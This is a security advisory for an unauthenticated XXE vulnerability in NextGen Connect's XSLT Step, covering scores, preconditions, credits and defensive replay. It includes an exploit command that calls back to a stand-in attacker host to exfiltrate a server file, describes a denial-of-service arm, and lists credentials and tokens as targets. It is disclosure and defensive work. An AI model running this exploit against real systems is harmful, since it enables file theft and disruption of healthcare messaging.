# CVE-2026-78224: unauthenticated XXE in the XSLT Step

**CVSS 3.1:** 8.2 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L`)

**CVSS 4.0:** 8.8 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:L/SC:N/SI:N/SA:N`)

**CWE:** CWE-611

**Tested:** NextGen Connect 4.5.2

**Fix guidance:** NextGen privately reported a 4.7.1 fix; CISA recommends 4.7.2 or later.

`XsltStep` creates a default `TransformerFactory` without secure processing or
restrictions on external DTD and stylesheet access. A channel can use a static,
administrator-created stylesheet while taking its source XML from the inbound
message. In that ordinary configuration, an unauthenticated sender controls the
XML parsed by the vulnerable factory.

The PoC installs a fixed identity-transform channel. The attacker then sends a
message containing only an external-DTD reference. The target resolves the DTD,
reads `/tmp/mirth-poc-canary.txt`, and returns the value to the attacker's OOB HTTP
callback. The exploit exits nonzero unless the exact target-only canary arrives.

```bash
./poc/run.sh
```

The standalone attacker also accepts `--file-uri file:///path/to/file` and can run
without `--expect` when the value is not known in advance. This OOB transport is
intended for single-line text files; the lab wrapper keeps `--expect` enabled to
make the replay fail closed.

```bash
python3 poc/exploit.py \
  --target http://target.example:9999/ \
  --callback-host attacker.example \
  --file-uri file:///etc/hostname
```

The standalone command performs file disclosure only. `./poc/run.sh` adds
`--confirm-dos` with an isolated control channel and recovery assertions.

The file-read proof is distinct from the configured response behavior: no
authenticated message-history read is used to recover the secret. The same harness
then holds one external entity open and requires three benign requests to time out
on the default one-thread victim channel. A separate channel and the admin API must
remain responsive, and the victim must recover after release. That supports `A:L`,
not whole-product `A:H`.

## Practical attacker value

The attacker receives file content over an outbound callback, so the exploit remains
useful when the normal listener response does not expose transformation output and the
attacker cannot read Mirth message history. The standalone client accepts a selected
single-line target-local `file:` URI. Host identifiers, tokens, configuration
fragments, or credentials are valuable targets if the Mirth service account can read
them and server egress permits the callback. The packaged run reads only a random
canary and does not claim access beyond the service account or reliable multiline
transport.

The slow-entity arm can also interrupt the specific interface implemented by the
affected channel. In a healthcare deployment that may delay messages routed through
that channel, but the proof deliberately shows that a control channel and admin API
remain healthy. No hospital-wide or whole-server outage is claimed.

## Preconditions

- A deployed channel contains an XSLT Step whose source is attacker-controlled
  message XML.
- The attacker can reach that channel listener.
- For OOB retrieval, the server can connect to an attacker-controlled endpoint.

These are deployment prerequisites. Once the listener exists, no authentication,
race, or user interaction is needed.

## Source

- [`XsltStep.java` lines 61-76](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/server/src/com/mirth/connect/plugins/xsltstep/XsltStep.java#L61-L76)
- [`SourceConnectorProperties.java` lines 80-92](https://github.com/nextgenhealthcare/connect/blob/6ce3a9f0e3d84841f0b1e07c2808cf0bdb3d0a78/donkey/src/main/java/com/mirth/connect/donkey/model/channel/SourceConnectorProperties.java#L80-L92)

I independently discovered this finding. Per NextGen, a researcher going by
**Youngdu** first reported it on 2026-02-24, and that is the report the 4.7.1 fix came
from. **Satish Singh** separately flagged the bare factory in [public GitHub issue
#6527](https://github.com/nextgenhealthcare/connect/issues/6527) on 2026-03-23.

## Defensive use

Defenders can replay the harness to identify affected XSLT channel patterns, confirm
that Mirth egress restrictions block the callback, tune monitoring for inbound
`DOCTYPE` declarations and unexpected Mirth-originated requests, and verify that a
fixed build rejects the exploit while ordinary channel traffic still works. The
healthy control channel and recovery checks help distinguish a bounded interface
stall from a server outage.
